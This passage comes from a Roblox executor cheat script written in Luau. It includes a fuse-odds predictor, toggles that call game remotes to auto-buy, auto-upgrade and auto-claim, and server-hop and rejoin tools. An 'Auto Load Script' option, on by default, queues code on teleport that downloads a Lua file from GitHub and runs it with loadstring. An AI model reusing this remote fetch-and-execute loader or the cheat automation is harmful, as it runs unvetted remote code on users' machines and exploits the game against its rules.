			return nil
		end
		return x / n19
	end

	local function fn26(arg, arg2)
		local v15 = fn24(arg)
		if not v15 then
			return nil
		end
		local size = v15.Size
		v15.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n19 + 0.5)), 100000)
		local y = v15.TextBounds.Y
		v15.Size = size
		if y <= 0 then
			return nil
		end
		return y / n19
	end

	local function fn27(arg)
		local v15 = tbl18[arg]

		if not v15 then
			v15 = v13:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			tbl18[arg] = v15
		end

		return v15
	end

	local function fn28(arg)
		local v15 = tbl17[arg]
		if v15 then
			return v15
		end

		local tbl21 = {
			Frame = v13:Frame({
				Name = "Slot",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
			}),
		}

		tbl21.Icon = v13:Image({
			Parent = tbl21.Frame,
			X = n12,
			Y = 0,
			Width = n11,
			Height = n11,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n17,
			StrokeTransparency = 0,
		})

		tbl21.Name = v13:Text({
			Parent = tbl21.Frame,
			X = n12 + n14,
			Y = 0,
			Width = 1,
			Height = n8,
			Scale = n9,
			Wrap = false,
			Gradient = tbl10.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl21.Rarity = v13:Text({
			Parent = tbl21.Frame,
			X = n12 + n14,
			Y = 0,
			Width = 1,
			Height = n8,
			Scale = n10,
			Wrap = false,
			Font = tbl10.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n20,
		})

		tbl21.Detail = v13:Text({
			Parent = tbl21.Frame,
			X = n12 + n14,
			Y = n8,
			Width = math.max(1, n18 - n14 - n12 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl21.Status = v13:Text({
			Parent = tbl21.Frame,
			X = 0,
			Y = 0,
			Width = 1,
			Height = n8,
			Wrap = false,
			Align = "Right",
			Color = color2.Hint,
		})

		tbl17[arg] = tbl21
		return tbl21
	end

	local function fn29()
		if n18 <= 0 then
			return
		end
		flag2 = false
		local n27 = math.max(1, n18 - n7)
		local v15 = fn25(tbl16.Rarity)

		if v15 then
			n25 = v15 + 0.1
		else
			flag2 = true
		end

		local v16 = fn25(tbl16.Name)

		if v16 then
			n24 = math.min(v16 + 0.1, math.max(1, n27 - n25 - n15))
		else
			flag2 = true
		end

		tbl16.Name.Set({ X = n7, Y = 0, Width = n24, Height = n8 })

		tbl16.Rarity.Set({
			X = n7 + n24 + n15,
			Y = 0,
			Width = math.max(0.5, math.min(n25, n27 - n24 - n15)),
			Height = n8,
		})

		tbl16.Info.Set({ X = n7, Y = n8, Width = n27, Height = math.max(1, n6 - n8) })
		local n28 = math.max(1, n18 - n14 - n12 * 2)
		local n29 = 0

		for _, v17 in ipairs(tbl19) do
			if v17.Kind == "text" then
				local handle = v17.Handle
				local v18 = fn26(handle, n18)

				if v18 then
					v17.Height = v18
				else
					flag2 = true
				end

				local n30 = math.max(1, v17.Height or 1)
				handle.Set({ X = 0, Y = n29 + (v17.Gap and 0.5 or 0), Width = n18, Height = n30 })
				n29 += n30 + n16 * 0.5 + (v17.Gap and 0.5 or 0)
			else
				local slot = v17.Slot
				local v18 = fn26(slot.Detail, n28)

				if v18 then
					slot.DetailUnits = v18
				else
					flag2 = true
				end

				local n30 = math.clamp(slot.DetailUnits or 1, 1, 4)
				local v19 = fn25(slot.Status)

				if v19 then
					slot.StatusUnits = v19 + 0.23
				else
					flag2 = true
				end

				local n31 = math.min(n28 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
				local n32 = math.max(1, n28 - n31 - n15)
				local v20 = fn25(slot.Rarity)

				if v20 then
					slot.RarityUnits = v20 + 0.1
				else
					flag2 = true
				end

				local n33 = math.min(slot.RarityUnits or 3, n32 * 0.5)
				local v21 = fn25(slot.Name)

				if v21 then
					slot.NameUnits = v21 + 0.1
				else
					flag2 = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = slot.NameUnits or 4
				local max2 = math.max
				local n34 = n32 - n33 - n15
				local v22 = min(max(1, nameUnits), max2(1, n34))
				local n35 = n13 * 2
				local n36 = math.max(n30 + n8, 2.3) + n35
				local n37 = (n36 - n30 - n8) / 2
				slot.Frame.Set({ X = 0, Y = n29, Width = n18, Height = n36 })
				slot.Icon.Set({ Y = (n36 - n11) / 2 })
				slot.Name.Set({ X = n12 + n14, Y = n37, Width = v22 })
				slot.Rarity.Set({ X = n12 + n14 + v22 + n15, Y = n37, Width = math.max(0.5, n33) })
				slot.Detail.Set({ X = n12 + n14, Y = n37 + n8, Width = n28, Height = n30 })
				slot.Status.Set({ X = n12 + n14 + n28 - n31, Y = n37, Width = math.max(0.5, n31) })
				n29 += n36 + n16
			end
		end

		local n30 = math.max(1, n29)

		if math.abs(n30 - n23) > 0.01 then
			n23 = n30
			v13:SetContentLines(n30)
		end
	end

	local function fn30(arg, arg2)
		local flag3 = arg ~= nil
		v13:SetDock(flag3 and 5 or 0, { Gap = n16 })
		tbl16.Icon.Set({ Visible = flag3 })
		tbl16.Name.Set({ Visible = flag3 })
		tbl16.Rarity.Set({ Visible = flag3 })
		tbl16.Info.Set({ Visible = flag3 })
		if not flag3 then
			return
		end
		tbl16.Icon.Set({ Visible = arg.Icon ~= nil, Image = arg.Icon or "", StrokeColor = arg.Color })
		tbl16.Name.Set({ Text = tbl10.Escape(arg.Name) })

		tbl16.Rarity.Set({
			Text = string.upper(tostring(arg.Rarity)),
			Color = fn21(arg),
			Gradient = fn20(arg),
			GradientRotation = fn22(arg),
		})

		local v15 = paint2(color2.Text, string.format("Fusing %d of 3 pets", #arg2.Items))

		if arg2.Reward then
			v15 = bold2(paint2(color2.Ready, "Fuse finished, claim your egg"))
		elseif arg2.Locked then
			local n27 = arg2.Duration > 1e9 and arg2.Duration - workspace:GetServerTimeNow() or 0
			v15 = bold2(paint2(color2.Clock, n27 > 0 and "Fusing" .. tbl10.Separator() .. tbl10.FormatClock(n27) or "Fusing"))
		end

		local set = tbl16.Info.Set
		local tbl21 = {}
		local concat = table.concat
		local tbl22 = {}
		local v16 = bold2(paint2(color2.Income, tbl10.FormatRate(tbl10.Income(arg, arg2.Items[1].Scale, arg2.Items[1].Mutations))))
		local v17 = paint2(color2.Text, string.format("%d/3 loaded", #arg2.Items))
		tbl22[1] = v16
		tbl22[2] = v17
		tbl22[3] = v15
		tbl21.Text = concat(tbl22, "\n")
		set(tbl21)
	end

	local function refreshFuse()
		if not v13 then
			return
		end
		n26 = 2
		table.clear(tbl19)
		local n27 = 0

		local function fn31(arg, arg2)
			n27 += 1
			local v15 = fn27(n27)
			v15.Set({ Visible = true, Text = arg })
			table.insert(tbl19, { Kind = "text", Handle = v15, Gap = arg2 })
		end

		local function fn32(arg, arg2)
			local flag3 = #tbl19 > 0
			fn31(string.format("<b><font color=\"%s\">%s</font></b>", arg2, arg), flag3)
		end

		local v15 = fn19()
		local n28

		if not v15 then
			fn30(nil, nil)
			fn31(bold2(paint2(color2.Hint, "Fuse machine data is not available yet")), false)
			n28 = 0
		elseif #v15.Items == 0 then
			fn30(nil, nil)
			fn31(bold2(paint2(color2.Text, "Machine is empty")), false)
			fn31(paint2(color2.Hint, "Load 3 pets of the same species to see the result odds"), false)
			n28 = 0
		else
			local items = v15.Items
			local v16 = tbl10.AssetInfo(items[1].Category)
			fn30(v16, v15)
			local text = color2.Text
			fn32(string.format("FUSE MACHINE STATUS (%d/3 PETS)", #items), text)
			fn31(paint2(color2.Hint, "Species") .. "  " .. bold2(paint2(v16.Hex, "[" .. string.upper(tostring(v16.Rarity)) .. "]")) .. " " .. bold2(paint2(color2.Text, tbl10.Escape(v16.Name))), false)
			n28 = 0

			for i = 1, 3 do
				local v17 = items[i]
				n28 += 1
				local v18 = fn28(n28)
				v18.Frame.Set({ Visible = true })
				v18.Status.Set({ Text = "SLOT " .. i })

				if v17 then
					v18.Icon.Set({ Visible = v16.Icon ~= nil, Image = v16.Icon or "", StrokeColor = v16.Color })
					v18.Name.Set({ Text = tbl10.Escape(v16.Name) })

					v18.Rarity.Set({
						Text = string.upper(tostring(v16.Rarity)),
						Color = fn21(v16),
						Gradient = fn20(v16),
						GradientRotation = fn22(v16),
					})

					local v19 = fn15(v17.Category, v17.Scale)
					local v20 = bold2(paint2(color2.Scale, string.format("%.2fx", v17.Scale)))
					local str

					if v19 then
						str = v20 .. tbl10.Separator() .. paint2(color2.Weight, tbl10.FormatWeight(v19))
					else
						str = v20
					end

					local str2 = str .. tbl10.Separator() .. bold2(paint2(color2.Income, tbl10.FormatRate(tbl10.Income(v16, v17.Scale, v17.Mutations))))
					local v21 = tbl10.MutationText(v17.Mutations)

					v18.Detail.Set({
						Text = str2 .. tbl10.Separator() .. (v21 ~= "" and v21 or paint2(color2.Hint, "Normal")),
					})
				else
					v18.Icon.Set({ Visible = false })
					v18.Name.Set({ Text = paint2(color2.Hint, "Empty") })
					v18.Rarity.Set({ Text = "", Gradient = nil })
					v18.Detail.Set({ Text = paint2(color2.Hint, "Add a pet to this slot") })
				end

				table.insert(tbl19, { Kind = "slot", Slot = v18 })
			end

			local n29 = 0

			for _, item in ipairs(items) do
				n29 += item.Scale
			end

			local n30 = n29 / #items
			local v17 = fn15(items[1].Category, n30)
			local str = paint2(color2.Hint, "Average Scale") .. "  " .. bold2(paint2(color2.Scale, string.format("%.2fx", n30)))

			if v17 then
				str ..= tbl10.Separator() .. paint2(color2.Weight, tbl10.FormatWeight(v17))
			end

			fn31(str, false)
			local v18 = nil

			for _, item in ipairs(items) do
				local v19 = fn16(item.Mutations)

				if v19 then
					if (v18 and tbl10.MutationMultiplier({ v18 }) or 0) < tbl10.MutationMultiplier({ v19 }) then
						v18 = v19
					end
				end
			end

			local tbl21 = v18 and { v18 } or {}
			fn32("PREDICTED SIZE PROBABILITIES", color2.Income)

			if #items == 3 then
				local tbl22 = { items[1].Scale, items[2].Scale, items[3].Scale }
				local tbl23 = {}
				local n31 = 0

				for _, v19 in ipairs(fn17()) do
					local n32 = v19.weight * fn18(tbl22, v19.min, v19.max)
					n31 += n32
					table.insert(tbl23, { Min = v19.min, Max = v19.max, Weight = n32, Color = fn14(v19.min) })
				end

				table.sort(tbl23, function(arg, arg2)
					return arg.Weight > arg2.Weight
				end)

				local v19 = tbl23[1]

				for _, v20 in ipairs(tbl23) do
					local n32 = n31 > 0 and v20.Weight / n31 * 100 or 0
					local v21 = bold2(paint2(v20.Color, string.format("%.2fx - %.2fx", v20.Min, v20.Max)))
					local v22 = fn15(items[1].Category, v20.Min)
					local v23 = fn15(items[1].Category, v20.Max)

					if v22 and v23 then
						local weight = color2.Weight
						local format = string.format
						local formatWeight = tbl10.FormatWeight
						v21 ..= tbl10.Separator() .. paint2(weight, format("%s - %s", tbl10.FormatWeight(v22), formatWeight(v23)))
					end

					fn31(v21 .. tbl10.Separator() .. bold2(paint2(n32 >= 10 and color2.Income or n32 >= 1 and color2.Clock or color2.Hint, string.format(n32 >= 1 and "%.1f%%" or "%.3f%%", n32))), false)
				end

				fn32("RESULT PREDICTION", color2.Text)
				fn31(paint2(color2.Hint, "Predicted Mutation") .. "  " .. (v18 and tbl10.MutationText(tbl21) or paint2(color2.Text, "Normal")), false)

				if v19 then
					fn31(paint2(color2.Hint, "Estimated Value") .. "  " .. bold2(paint2(color2.Income, tbl10.FormatRate(tbl10.Income(v16, v19.Min, tbl21)) .. " ~ " .. tbl10.FormatRate(tbl10.Income(v16, v19.Max, tbl21)))) .. tbl10.Separator() .. paint2(color2.Hint, "at ") .. bold2(paint2(v19.Color, string.format("%.2fx - %.2fx", v19.Min, v19.Max))), false)
				end

				local v20 = nil

				for _, v21 in ipairs(tbl23) do
					if not v20 or v21.Max > v20.Max then
						v20 = v21
					end
				end

				if v20 then
					fn31(paint2(color2.Hint, "Best Case") .. "  " .. bold2(paint2(v20.Color, string.format("%.2fx - %.2fx", v20.Min, v20.Max))) .. "  " .. bold2(paint2(color2.Income, tbl10.FormatRate(tbl10.Income(v16, v20.Max, tbl21)))), false)
				end
			else
				fn31(paint2(color2.Hint, string.format("Load %d more of the same species to see the odds", 3 - #v15.Items)), false)
			end
		end

		for i = n27 + 1, #tbl18 do
			tbl18[i].Set({ Visible = false })
		end

		for i = n28 + 1, #tbl17 do
			tbl17[i].Frame.Set({ Visible = false })
		end

		fn29()
		n26 = 2
	end

	if not tbl10.Ready then
		v11:CreateText({ Name = "Fuse Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		local v15 = v11:CreateCanvas({
			Name = "Fuse Predictor",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 34,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(arg)
				fn23(arg)

				if type(tbl10.RequestEggRefresh) == "function" then
					tbl10.RequestEggRefresh()
				end
			end,
		})

		tbl10.RefreshFuse = refreshFuse

		tbl10.PlaceFuse = function()
			if n26 > 0 or flag2 then
				if n26 > 0 then
					n26 -= 1
				end

				pcall(fn29)
			end
		end

		fn4(function()
			v15:Destroy()
		end)
	end
end

do
	local v13 = v2:CreateTab({ Name = "Progress", SectionsExpanded = true }):CreateSection({ Name = "Auto Progression", Expanded = true })
	local tbl15 = {}
	local tbl16

	tbl16 = {
		Remote = function(arg)
			local v14 = tbl15[arg]
			if v14 ~= nil then
				return v14 or nil
			end
			local v15 = networking:FindFirstChild(arg)
			tbl15[arg] = v15 or false
			return v15
		end,
		Invoke = function(arg, ...)
			local v14 = tbl16.Remote(arg)
			if not v14 or not v14:IsA("RemoteFunction") then
				return false, nil
			end
			local ok, result = pcall(v14.InvokeServer, v14, ...)
			return ok, result
		end,
		Fire = function(arg, ...)
			local v14 = tbl16.Remote(arg)
			if not v14 or not v14:IsA("RemoteEvent") then
				return false
			end
			return pcall(v14.FireServer, v14, ...)
		end,
	}

	local function saveData()
		local save = tbl.Save
		if type(save) ~= "table" or type(save.Get) ~= "function" then
			return nil
		end
		local ok, result = pcall(save.Get)
		return ok and type(result) == "table" and result or nil
	end

	tbl16.SaveData = saveData
	local tbl17 = { "Money", "Cash", "Coins", "Currency", "Balance" }

	tbl16.Money = function()
		local v14 = saveData()

		if v14 then
			for _, v15 in ipairs(tbl17) do
				local num = tonumber(v14[v15])
				if num then
					return num
				end
			end
		end

		local leaderstats = localPlayer:FindFirstChild("leaderstats")

		if leaderstats then
			for _, v15 in ipairs(tbl17) do
				local v16 = leaderstats:FindFirstChild(v15)
				if v16 and tonumber(v16.Value) then
					return tonumber(v16.Value)
				end
			end
		end

		return nil
	end

	tbl16.AddWorker = tbl2.Add
	tbl16.Backoff = tbl2.Backoff

	local tbl18 = {
		"Money",
		"BaseUpgradeLevel",
		"TreadmillUpgradeLevel",
		"TrailInventory",
		"PendingOfflineMoney",
	}

	local save = tbl.Save

	if type(save) == "table" and type(save.FieldSignal) == "function" then
		for _, v14 in ipairs(tbl18) do
			local ok, result = pcall(save.FieldSignal, v14)

			if ok and type(result) == "table" and type(result.Connect) == "function" then
				local ok2, result2 = pcall(result.Connect, result, function()
					tbl2.Wake()
				end)

				if ok2 and result2 then
					fn4(function()
						pcall(function()
							result2:Disconnect()
						end)
					end)
				end
			end
		end
	end

	local v14 = nil
	local v15 = nil
	local tbl19 = {}

	local function fn14()
		local v16 = fn2(function()
			return ReplicatedStorage.Data.Trails
		end)

		local directory = type(v16) == "table" and v16.Directory or nil
		if type(directory) ~= "table" then
			return {}
		end
		local tbl20 = {}

		for k, v17 in pairs(directory) do
			if type(v17) == "table" then
				local insert = table.insert
				local tbl21 = {}
				local v18 = tostring
				k = v17._id or k
				tbl21.Id = v18(k)
				tbl21.Price = tonumber(v17.Price) or math.huge
				insert(tbl20, tbl21)
			end
		end

		table.sort(tbl20, function(arg, arg2)
			return arg.Price < arg2.Price
		end)

		return tbl20
	end

	local function fn15(arg)
		if not tbl4.ReadToggle(v14, false) then
			return false
		end
		v15 = v15 or fn14()
		local v16 = tbl16.SaveData()
		if not v16 or #v15 == 0 then
			return false
		end
		local trailInventory = type(v16.TrailInventory) == "table" and v16.TrailInventory or {}
		local n13 = tonumber(v16.Money) or 0

		for _, v17 in ipairs(v15) do
			if trailInventory[v17.Id] ~= true and not tbl19[v17.Id] and v17.Price <= n13 then
				local AskPurchase, v18 = tbl16.Invoke("RF/Trailwear/AskPurchase", v17.Id)
				if AskPurchase and v18 ~= false then
					return true
				end
				tbl19[v17.Id] = true
				tbl16.Backoff(arg)
				return false
			end
		end

		return false
	end

	v14 = v13:CreateToggle({
		Name = "Auto Buy Trail",
		Note = "Automatically buy available trails when affordable",
		Default = false,
		Callback = function()
			table.clear(tbl19)
			v15 = nil
		end,
	})

	tbl16.AddWorker(fn15)
	local v16 = nil

	local function fn16()
		if not tbl4.ReadToggle(v16, false) then
			return false
		end
		local v17 = tbl16.SaveData()
		if not v17 then
			return false
		end

		local v18 = fn2(function()
			return ReplicatedStorage.Data.Bases
		end)

		local bases = type(v18) == "table" and v18.BASES or nil
		if type(bases) ~= "table" then
			return false
		end
		local n13 = tonumber(v17.BaseUpgradeLevel) or 0
		local num = nil

		if type(v18.GetMaxBaseLevel) == "function" then
			local ok, result = pcall(v18.GetMaxBaseLevel)
			num = ok and tonumber(result) or nil
		end

		if num and n13 >= num then
			return false
		end
		local v19 = bases[n13 + 1]
		local num2 = type(v19) == "table" and tonumber(v19.Cost) or nil

		if num2 then
			num2 = (tonumber(v17.Money) or 0) >= num2
		end

		if num2 then
			return tbl16.Fire("RE/Homestead/AskBaseTierRaise")
		end
		return false
	end

	v16 = v13:CreateToggle({
		Name = "Auto Upgrade Base",
		Note = "Automatically upgrade base when money is available",
		Default = false,
	})

	tbl16.AddWorker(fn16)
	local v17 = nil

	local function fn17()
		if not tbl4.ReadToggle(v17, false) then
			return false
		end
		local v18 = tbl16.SaveData()
		if not v18 then
			return false
		end

		local v19 = fn2(function()
			return ReplicatedStorage.Data.Treadmills
		end)

		if type(v19) ~= "table" or type(v19.GetByUpgradeLevel) ~= "function" then
			return false
		end
		local ok, result = pcall(v19.GetByUpgradeLevel, (tonumber(v18.TreadmillUpgradeLevel) or 0) + 1)
		if not ok or type(result) ~= "table" then
			return false
		end
		local id = result._id
		local huge = tonumber(result.Price) or math.huge
		local flag2 = type(id) == "string"

		if flag2 then
			flag2 = (tonumber(v18.Money) or 0) >= huge
		end

		if flag2 then
			local AskTierRaise, v20 = tbl16.Invoke("RF/Treadmill/AskTierRaise", id)
			return AskTierRaise and v20 ~= false
		end
		return false
	end

	v17 = v13:CreateToggle({
		Name = "Auto Upgrade Treadmill",
		Note = "Automatically upgrade treadmill when money is available",
		Default = false,
	})

	tbl16.AddWorker(fn17)
	local n13 = 15
	local v18 = nil
	local n14 = 15
	local now = os.clock()

	local function fn18()
		if not tbl4.ReadToggle(v18, false) then
			return false
		end
		local now2 = os.clock()
		n14 += now2 - now
		now = now2
		local v19 = tbl16.SaveData()
		local num = v19 and tonumber(v19.PendingOfflineMoney) or nil

		if num == nil then
			local PendingCheck, v20 = tbl16.Invoke("RF/AwayEarnings/PendingCheck")
			num = PendingCheck and v20 ~= false and v20 ~= nil and 1 or 0
		end

		local flag2 = false

		if num > 0 then
			local v20
			flag2, v20 = tbl16.Invoke("RF/AwayEarnings/AskCollect")
			flag2 = flag2 and v20 ~= false
		end

		if n13 <= n14 then
			n14 = 0
			local AskRedeemAll, v20 = tbl16.Invoke("RF/Codex/AskRedeemAll")
			flag2 = flag2 or AskRedeemAll and v20 ~= false
			tbl16.Invoke("RF/Codex/AskRedeemLimitedEgg")
		end

		return flag2
	end

	v18 = v13:CreateToggle({
		Name = "Auto Claim",
		Note = "Claim offline money & index rewards",
		Default = false,
		Callback = function()
			n14 = n13
		end,
	})

	tbl16.AddWorker(fn18)
end

local fn14

fn14 = function(arg, arg2)
	if type(v.Notify) == "function" then
		pcall(v.Notify, arg, arg2, 5)
	end
end

local v13
v13 = v2:CreateTab({ Name = "Server", SectionsExpanded = true }):CreateSection({ Name = "Server", Expanded = true })
local TeleportService
TeleportService = game:GetService("TeleportService")
local HttpService
HttpService = game:GetService("HttpService")
local GuiService
GuiService = game:GetService("GuiService")

do
	local function fn15()
		if type(queue_on_teleport) == "function" then
			return queue_on_teleport
		end

		if type(queueonteleport) == "function" then
			return queueonteleport
		end

		if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
			return syn.queue_on_teleport
		end

		if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
			return fluxus.queue_on_teleport
		end
		return nil
	end

	local function fn16(arg)
		pcall(function()
			TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", arg)
		end)

		if not arg then
			return true
		end
		local v14 = fn15()
		if not v14 then
			return false
		end

		if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
			if not pcall(v14, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true
end)
if enabled then
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    pcall(function()
        local player = game:GetService("Players").LocalPlayer
        if player and not player.Character then
            player.CharacterAdded:Wait()
        end
    end)
    task.wait(3)
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end
    end
end
]]) then
				return false
			end

			_G.__ChilliAutoLoadQueued = true
		end

		return true
	end

	local v14 = nil

	local function fn17()
		if v14 and tbl3.Toggle(v14, false) then
			fn16(true)
		end
	end

	v14 = v13:CreateToggle({
		Name = "Auto Load Script",
		Default = true,
		Callback = function(arg)
			local flag2 = arg == true

			if not fn16(flag2) and flag2 then
				task.defer(function()
					fn16(false)

					if v14 and type(v14.Set) == "function" then
						pcall(v14.Set, v14, false, false)
					end

					fn14("Auto Load Unavailable", "This executor does not support queue on teleport.")
				end)
			end
		end,
	})

	local str = "Least Players"
	local n13 = 10
	local n14 = 0
	local v15 = nil
	local tbl15 = {}
	local flag2 = false
	local n15 = 0
	local flag3 = false
	local v16 = nil
	local str2 = ""
	local n16 = 0
	local n17 = 60

	local function fn18(arg)
		n14 = 0
		v15 = nil

		if arg then
			tbl15[arg] = true
		end
	end

	pcall(function()
		TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
			if not v15 then
				return
			end
			fn18(v15)
			flag3 = true

			if not flag2 then
				fn14("Server Hop Failed", tostring(arg3 ~= "" and arg3 or arg2))
			end
		end)
	end)

	local function fn19(arg)
		local str3 = tostring(game.JobId or "")
		local tbl16 = {}
		local flag4 = arg == "Random"
		local str4 = arg == "Least Players" and "Asc" or "Desc"
		local n18 = flag4 and 3 or 6
		local nextPageCursor = nil

		for i = 1, n18 do
			local str5 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str4)

			if nextPageCursor and nextPageCursor ~= "" then
				str5 ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
			end

			local ok, result = pcall(function()
				return HttpService:JSONDecode(game:HttpGet(str5))
			end)

			if not ok or type(result) ~= "table" then
				return tbl16, false
			end
			local v17 = ipairs
			local data = result.data or {}

			for _, v18 in v17(data) do
				local str6 = tostring(v18.id or "")
				local huge = tonumber(v18.playing) or math.huge
				local n19 = tonumber(v18.maxPlayers) or 0

				if str6 ~= "" and str6 ~= str3 and huge < n19 then
					tbl16[#tbl16 + 1] = { Id = str6, Playing = huge, Room = n19 - huge }
				end
			end

			if #tbl16 > 0 and not flag4 then
				break
			end
			nextPageCursor = result.nextPageCursor
			if not nextPageCursor or nextPageCursor == "" then
				break
			end
		end

		return tbl16, true
	end

	local function serverHop(arg)
		local v17

		if v16 and str2 == arg and os.clock() - n16 < n17 then
			v17 = v16
		else
			local v18
			v17, v18 = fn19(arg)
			if not v18 then
				return "fetch"
			end
			v16 = v17
			str2 = arg
			n16 = os.clock()
		end

		local function fn20(arg2)
			local tbl16 = {}

			for _, v18 in ipairs(v17) do
				if not tbl15[v18.Id] and v18.Room >= arg2 then
					tbl16[#tbl16 + 1] = v18
				end
			end

			return tbl16
		end

		local v18 = fn20(2)

		if #v18 == 0 then
			v18 = fn20(1)
		end

		if #v18 == 0 and next(tbl15) ~= nil then
			table.clear(tbl15)
			v18 = fn20(1)
		end

		if #v18 == 0 then
			fn18(nil)
			v16 = nil
			return "empty"
		end

		local id

		if arg == "Random" then
			id = v18[math.random(1, #v18)].Id
		else
			table.sort(v18, function(arg2, arg3)
				if arg == "Least Players" then
					return arg2.Playing < arg3.Playing
				end
				return arg2.Playing > arg3.Playing
			end)

			id = v18[1].Id
		end

		flag3 = false
		v15 = id
		n14 = os.clock() + n13
		pcall(fn17)

		if not pcall(function()
			TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
		end) then
			fn18(id)
			return "failed"
		end

		local n18 = os.clock() + n13

		while os.clock() < n18 do
			if flag3 then
				return "denied"
			end
			task.wait(0.25)
		end

		return "waiting"
	end

	tbl3.ServerHop = serverHop

	v13:CreateDropdown({
		Name = "Server Hop Mode",
		Options = { "Most Players", "Random", "Least Players" },
		Default = "Least Players",
		Callback = function(arg)
			str = tostring(arg or "Least Players")
		end,
	})

	v13:CreateButton({
		Name = "Server Hop",
		ButtonText = "Hop",
		Callback = function()
			n15 += 1
			local v17 = n15

			task.spawn(function()
				flag2 = true
				local n18 = 0

				while v17 == n15 do
					n18 += 1
					local v18 = serverHop(str)

					if not (v18 == "waiting" or v17 ~= n15) then
						if v18 == "empty" then
							v16 = nil
							table.clear(tbl15)
						end

						if n18 % 10 == 0 then
							fn14("Server Hop", string.format("Every server was full so far, %d tries.", n18))
						end

						task.wait(v18 == "fetch" and 1 or 0.1)
						continue
					end

					break
				end

				if v17 == n15 then
					flag2 = false
				end
			end)
		end,
	})
end

do
	local n13 = 8
	local n14 = 0
	local str = ""
	local v14 = nil

	local function fn15()
		return os.clock() < n14
	end

	local function fn16(arg)
		n14 = arg and os.clock() + n13 or 0
	end

	local function fn17(arg)
		local match = tostring(arg or ""):match("^%s*(.-)%s*$")
		return match:match("%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") or match
	end

	local function fn18()
		local v15 = str
		local result = str

		if v14 then
			local ok

			ok, result = pcall(function()
				local controller = v14._controller
				return controller and controller.GetValue and controller.GetValue()
			end)

			if not (ok and type(result) == "string" and result ~= "") then
				local exitTo = nil

				for _, v16 in ipairs({ "Get", "GetValue", "GetText" }) do
					local ok2, result2 = pcall(function()
						return v14[v16]
					end)

					if ok2 and type(result2) == "function" then
						local ok3
						ok3, result = pcall(result2, v14)
						if ok3 and type(result) == "string" and result ~= "" then
							exitTo = 1
							break
						end
					end
				end

				if exitTo ~= 1 then
					result = v15
				end
			end
		end

		local v16 = fn17(result)

		if v16 == "" then
			local ok, result2 = pcall(function()
				local v17 = getclipboard or readclipboard or getrbxclipboard
				return type(v17) == "function" and v17() or nil
			end)

			if ok and type(result2) == "string" then
				v16 = fn17(result2)
			end
		end

		return v16
	end

	local function fn19(arg)
		if not v14 then
			return
		end

		pcall(function()
			local controller = v14._controller

			if controller and controller.SetValue then
				controller.SetValue(arg, false)
			end
		end)

		str = fn17(arg)
	end

	local function fn20(arg)
		fn16(true)
		pcall(AutoLoadBeforeTeleport)

		if not pcall(function()
			if game.JobId ~= "" then
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
			else
				TeleportService:Teleport(game.PlaceId, localPlayer)
			end
		end) then
			fn16(false)
			fn14(arg, "Roblox could not rejoin the server.")
		end
	end

	pcall(function()
		TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
			if not fn15() then
				return
			end
			fn16(false)
			fn14("Teleport Failed", tostring(arg3 ~= "" and arg3 or arg2))
		end)
	end)

	v14 = v13:CreateInput({
		Name = "Job ID",
		Placeholder = "Paste a server Job ID...",
		Default = "",
		MaxLength = 100,
		Callback = function(arg)
			str = fn17(arg)
		end,
	})

	if v14 then
		v14._configIgnored = true

		if v14.State and not v14.State._registered then
			v14.State._configIgnored = true
		end
	end

	v13:CreateButton({
		Name = "Join Job ID",
		ButtonText = "Join",
		Callback = function()
			if fn15() then
				fn14("Join Job ID Failed", "A teleport is already running, try again shortly.")
				return
			end
			local v15 = fn18()
			if v15 == "" then
				fn14("Join Job ID Failed", "Paste a valid Job ID first.")
				return
			end
			fn16(true)
			pcall(AutoLoadBeforeTeleport)

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, v15, localPlayer)
			end) then
				fn16(false)
				fn14("Join Job ID Failed", "Roblox could not join that server.")
			end
		end,
	})

	v13:CreateButton({
		Name = "Copy Current Job ID",
		ButtonText = "Copy",
		Callback = function()
			local str2 = tostring(game.JobId or "")
			fn19(str2)
			local v15 = setclipboard or toclipboard
			fn14((type(v15) == "function" and pcall(v15, str2) or false) and "Job ID Copied" or "Job ID Shown", str2)
		end,
	})

	v13:CreateButton({
		Name = "Rejoin Server",
		ButtonText = "Rejoin",
		Callback = function()
			if fn15() then
				fn14("Rejoin Failed", "A teleport is already running, try again shortly.")
				return
			end
			fn20("Rejoin Failed")
		end,
	})

	local tbl15 = { Option = nil, Fired = false, TeleportingAt = 0 }

	local function fn21()
